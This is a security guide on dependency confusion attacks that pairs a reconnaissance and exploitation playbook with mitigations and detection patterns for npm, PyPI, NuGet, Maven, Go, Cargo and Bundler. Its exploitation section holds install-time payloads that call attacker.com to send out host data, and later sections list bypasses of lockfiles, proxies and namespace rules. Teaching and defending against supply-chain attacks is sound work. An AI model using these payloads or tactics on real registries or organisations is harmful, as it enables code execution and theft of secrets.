## 1. Overview

**Dependency Confusion** (substitution attacks) occurs when a package manager resolves a dependency from an unintended, untrusted registry—typically a public one—instead of the intended private/internal source. This leads to installation of attacker-controlled packages with potential code execution.

**Root Causes:**

- **Typosquatting/Misspelling**: Importing `reqests` instead of `requests` resolves from public registry
- **Non-existent/Abandoned Internal Packages**: Importing `company-logging` that no longer exists internally causes resolver to check public registries
- **Version Preference Across Registries**: Resolver queries multiple registries and prefers the "best"/newer version, allowing attackers to publish higher-versioned malicious packages publicly

**Core Concept**: If your resolver can query multiple registries for the same package name and picks the "best" candidate globally, you're vulnerable unless resolution is strictly constrained.

---

## 2. Exploitation Methods

### 🎯 Attack Vectors

#### **A. Misspelled Dependencies**

**When It Works**: Target misspells a legitimate package name in their manifest

**Steps:**

1. Monitor public repositories for common typos in manifests (`package.json`, `requirements.txt`, etc.)
2. Register the misspelled name on public registry
3. Wait for targets to install

**Example**: `reqests`, `pillow-pil`, `npmm` instead of correct names

---

#### **B. Non-existent Internal Packages**

**When It Works**: Internal package name exists in codebase but not in private registry

**Steps:**

1. Enumerate internal package names from exposed manifests/repos
2. Check if name is available on public registry
3. Publish malicious package with that name
4. Target's resolver falls back to public registry and installs your package

---

#### **C. Version Hijacking**

**When It Works**: Resolver queries both internal and public registries, selecting highest version

**Steps:**

1. Identify internal package name (e.g., `@company/api-client` at v1.0.1)
2. Publish malicious package to public registry with higher version (v1.0.2 or v99.99.99)
3. If resolver considers both sources, your version wins
4. Code execution occurs during install or import

---

### 🔍 Reconnaissance Playbook

**Step 1: Enumerate Internal Package Names**

- [ ] Search GitHub/GitLab for organization repos containing manifests
- [ ] Grep CI/CD configs for internal dependencies
- [ ] Look for patterns: `@company/*`, `company-*`, `com.company.*`, internal Go module paths
- [ ] Check lockfiles for full dependency trees

**Step 2: Verify Public Availability**

- [ ] Check npm: `npm view <package-name>`
- [ ] Check PyPI: `pip index versions <package-name>`
- [ ] Check NuGet: Browse `nuget.org/packages/<name>`
- [ ] Check Maven Central: Search `search.maven.org`

**Step 3: Craft Malicious Package**

- [ ] Choose semver that wins (very high version like `999.0.0`)
- [ ] Include install-time execution hooks where supported:
    - **npm**: `preinstall`, `install`, `postinstall` scripts in `package.json`
    - **Python**: Import-time code execution (wheels don't run arbitrary install code)
    - **Ruby**: `extconf.rb` or gemspec scripts
    - **Maven/Gradle**: Build plugins or init scripts
- [ ] Add exfiltration mechanism (HTTP callback, DNS query, error messages)

**Step 4: Publish & Monitor**

- [ ] Publish to public registry
- [ ] Monitor callback endpoint for executions
- [ ] Document affected targets

---

### 💣 Code Execution Techniques

**npm Example (`package.json`)**:

```json
{
  "name": "company-internal-lib",
  "version": "999.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/exfil?pkg=company-internal-lib&host=$(hostname)"
  }
}
```

**Python Example (import-time execution in `__init__.py`)**:

```python
import os
import urllib.request

hostname = os.uname().nodename
urllib.request.urlopen(f'https://attacker.com/exfil?pkg=company-lib&host={hostname}')
```

**NuGet Example (MSBuild target injection)**:

```xml
<Project>
  <Target Name="ExfilData" BeforeTargets="Build">
    <Exec Command="curl https://attacker.com/exfil?pkg=Company.Internal" />
  </Target>
</Project>
```

---

### ⚠️ Responsible Testing Guidelines

> **CAUTION**: Always obtain written authorization before testing dependency confusion vulnerabilities.

**Best Practices:**

- Use unique, engagement-specific package names
- Include kill-switch/expiration in malicious code
- Coordinate immediate unpublishing after testing
- Document all published packages for cleanup
- Use DNS exfil if outbound HTTP is blocked
- Never exfiltrate sensitive data—proof of execution only

---

## 3. Bypasses

### 🔓 Evading Common Protections

#### **Namespace Restrictions**

**Defense**: Organizations restrict internal packages to specific namespaces (`@company/*`)

**Bypass Attempts:**

- Target **unscoped transitive dependencies** used by internal packages
- Exploit **inconsistent namespace enforcement** across different package managers in monorepos
- Find **abandoned internal dependencies** that predate namespace policy

---

#### **Version Pinning**

**Defense**: Lockfiles pin exact versions

**Bypass Attempts:**

- Target **unpinned development dependencies** (`devDependencies` without locks)
- Exploit **lockfile regeneration** during dependency updates
- Attack **new projects** before first lockfile commit
- Target **scripts that run `npm install --force`** or `pip install --upgrade`

---

#### **Private Registry Proxies**

**Defense**: All installs go through corporate proxy that blocks unknown internal names

**Bypass Attempts:**

- Identify **proxy misconfigurations** where fallback is enabled
- Target **local developer environments** that bypass proxy
- Exploit **allowlist gaps** in proxy configuration
- Attack during **proxy downtime** when fallback to public registry is automatic

---

#### **Hash Verification**

**Defense**: Package managers verify checksums/hashes (pip `--require-hashes`, Gradle verification)

**Bypass Strategy:**

- Attack occurs **before hashes are generated** (first install)
- Target **projects without hash pinning**
- Exploit **hash regeneration** during dependency updates

---

## 4. Higher Impact Scenarios

### 🚀 Amplification Techniques

#### **Supply Chain Cascade**

**Impact**: Single compromised dependency affects entire organization

**Scenario:**

1. Compromise widely-used internal library (`company-auth`)
2. All internal projects import this library
3. Malicious code executes across development, CI/CD, and production environments
4. Lateral movement and persistence across infrastructure

**Detection Challenge**: Legitimate-looking package name makes detection difficult

---

#### **CI/CD Pipeline Compromise**

**Impact**: Code execution in build environment with elevated privileges

**Scenario:**

1. Target packages used exclusively in CI pipelines
2. Gain access to secrets, tokens, and deployment credentials
3. Modify build artifacts before deployment
4. Inject backdoors into production releases

**Why It Matters**: CI systems often have broad access and weak monitoring

---

#### **Cross-Platform Monorepo Attacks**

**Impact**: Exploit weakest link in multi-language projects

**Scenario:**

1. Organization uses monorepo with JavaScript, Python, and Java components
2. Python has strong protections (hashed requirements)
3. JavaScript has weak protections (no lockfile enforcement)
4. Compromise JavaScript dependency
5. Use access to attack Python/Java components via shared infrastructure

---

#### **Transitive Dependency Hijacking**

**Impact**: Target indirect dependencies to evade direct dependency audits

**Scenario:**

1. Identify internal package `A` that depends on internal package `B`
2. Package `B` is less monitored/documented
3. Publish malicious `B` to public registry
4. When `A` is installed, malicious `B` is pulled in
5. Audits focus on direct dependencies, missing the attack

---

## 5. Mitigation Strategies

### 🛡️ Defense-in-Depth Approach

#### **Strategy 1: Namespace Isolation**

**Action Steps:**

- [ ] Use unique namespaces for all internal code (`@company/*`, `com.company.*`)
- [ ] Bind namespaces to single registry source
- [ ] Reserve internal namespaces on public registries
- [ ] Enforce namespace policies in CI checks

---

#### **Strategy 2: Single Registry Source**

**Action Steps:**

- [ ] Deploy internal registry (Artifactory, Nexus, CodeArtifact, GitHub Packages)
- [ ] Configure as **only** endpoint for package resolution
- [ ] Proxy approved public packages through internal registry
- [ ] Block direct access to public registries at network layer
- [ ] Implement allowlist/blocklist for internal namespace patterns

---

#### **Strategy 3: Lockfile Enforcement**

**Action Steps:**

- [ ] Commit lockfiles to version control
- [ ] Make CI builds immutable (fail on lockfile changes)
- [ ] Use `npm ci` instead of `npm install`
- [ ] Enable `yarn install --immutable`
- [ ] Require pip `--require-hashes` in CI

---

#### **Strategy 4: Hash/Checksum Pinning**

**Action Steps:**

- [ ] Generate hashed requirements: `pip-compile --generate-hashes`
- [ ] Enable Gradle dependency verification
- [ ] Commit `verification-metadata.xml`
- [ ] Fail builds on unknown artifacts

---

### 📦 Ecosystem-Specific Configurations

#### **JavaScript/TypeScript (npm, Yarn, pnpm)**

**Project `.npmrc`**:

```ini
# Bind scope to private registry
@company:registry=https://registry.corp.example/npm/
//registry.corp.example/npm/:_authToken=${NPM_TOKEN}
strict-ssl=true
```

**Yarn Berry `.yarnrc.yml`**:

```yaml
npmScopes:
  company:
    npmRegistryServer: "https://registry.corp.example/npm/"
    npmAlwaysAuth: true
enableImmutableInstalls: true
```

**Key Actions:**

- Publish internal packages only in scoped namespace
- Enforce lockfiles in CI
- Proxy third-party packages through internal registry

---

#### **Python (pip/Poetry)**

**`pip.conf`**:

```ini
[global]
index-url = https://pypi.corp.example/simple
only-binary = :all:
require-hashes = true
```

**Generate Hashed Requirements**:

```bash
pip-compile --generate-hashes -o requirements.txt
pip install --require-hashes -r requirements.txt
```

**Critical Rule**: Never use `--extra-index-url` to mix trust levels

---

#### **.NET (NuGet)**

**`nuget.config` with Package Source Mapping**:

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <clear />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
    <add key="corp" value="https://nuget.corp.example/v3/index.json" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="nuget.org">
      <package pattern="*" />
    </packageSource>
    <packageSource key="corp">
      <package pattern="Company.*" />
      <package pattern="Internal.*" />
    </packageSource>
  </packageSourceMapping>
</configuration>
```

---

#### **Java (Maven/Gradle)**

**Maven `settings.xml`**:

```xml
<settings>
  <mirrors>
    <mirror>
      <id>internal-mirror</id>
      <mirrorOf>*</mirrorOf>
      <url>https://maven.corp.example/repository/group</url>
    </mirror>
  </mirrors>
</settings>
```

**Enforcer Plugin (ban POM repositories)**:

```xml
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-enforcer-plugin</artifactId>
  <version>3.6.1</version>
  <executions>
    <execution>
      <id>enforce-no-repositories</id>
      <goals><goal>enforce</goal></goals>
      <configuration>
        <rules>
          <requireNoRepositories />
        </rules>
      </configuration>
    </execution>
  </executions>
</plugin>
```

**Gradle `settings.gradle.kts`**:

```kotlin
dependencyResolutionManagement {
  repositoriesMode = RepositoriesMode.FAIL_ON_PROJECT_REPOS
  repositories {
    maven { url = uri("https://maven.corp.example/repository/group") }
  }
}
```

Enable dependency verification and commit `gradle/verification-metadata.xml`

---

#### **Go Modules**

**Environment Configuration**:

```bash
# Corporate proxy first, public fallback
export GOPROXY=https://goproxy.corp.example,https://proxy.golang.org

# Skip proxy/checksum for private modules
export GOPRIVATE=*.corp.example.com,github.com/your-org/*
export GONOSUMDB=*.corp.example.com,github.com/your-org/*
```

---

#### **Rust (Cargo)**

**`.cargo/config.toml`**:

```toml
[source.crates-io]
replace-with = "corp-mirror"

[source.corp-mirror]
registry = "https://crates-mirror.corp.example/index"
```

Use `--registry` flag when publishing to specify target

---

#### **Ruby (Bundler)**

**`Gemfile` with Source Blocks**:

```ruby
source "https://gems.corp.example"

source "https://rubygems.org" do
  gem "rails"
  gem "pg"
end

source "https://gems.corp.example" do
  gem "company-logging"
end
```

**Enforce Single Source**:

```bash
bundle config set disable_multisource true
```

---

### 🔒 Registry & CI/CD Controls

**Registry Configuration:**

- [ ] Block internal namespaces from resolving to public sources
- [ ] Implement name reservation for internal patterns
- [ ] Enable audit logging for all package installations
- [ ] Configure upstream proxy rules with explicit allowlists

**CI/CD Hardening:**

- [ ] Make lockfiles immutable (fail on changes)
- [ ] Block outbound traffic to public registries (except via proxy)
- [ ] Scan manifests for unscoped/unnamespaced internal dependencies
- [ ] Alert on new package installations from public registries
- [ ] Enable package provenance/attestations for published packages

**Network Controls:**

- [ ] Egress filtering: Allow only approved registry endpoints
- [ ] DNS blocking: Prevent resolution of public registry domains
- [ ] TLS inspection: Monitor package download sources

---

### 📊 Monitoring & Detection

**What to Monitor:**

- New package installations from public registries
- Version downgrades (potential lockfile manipulation)
- Installations of previously unknown package names
- Outbound connections during package install phase
- Changes to registry configuration files

**Detection Patterns:**

```bash
# Alert on unscoped npm packages in internal projects
grep -r '"name":\s*"[^@]' package.json

# Find pip installs without hash verification
grep -r "pip install" .github/ | grep -v "\--require-hashes"

# Detect Maven repos in POMs
grep -r "<repositories>" pom.xml
```

---

## 6. References

**Primary Research:**

- [Original Dependency Confusion Research by Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [AWS CodeArtifact Vulnerability Analysis](https://zego.engineering/dependency-confusion-in-aws-codeartifact-86b9ff68963d)

**Official Documentation:**

- [NuGet Package Source Mapping](https://learn.microsoft.com/en-us/nuget/consume-packages/package-source-mapping)
- [Yarn Configuration Reference](https://yarnpkg.com/configuration/yarnrc/)

---

**Pro Tip:** Dependency confusion is preventable with proper configuration. Focus on namespace isolation, single registry sources, and lockfile enforcement. Every layer of defense counts! 🚀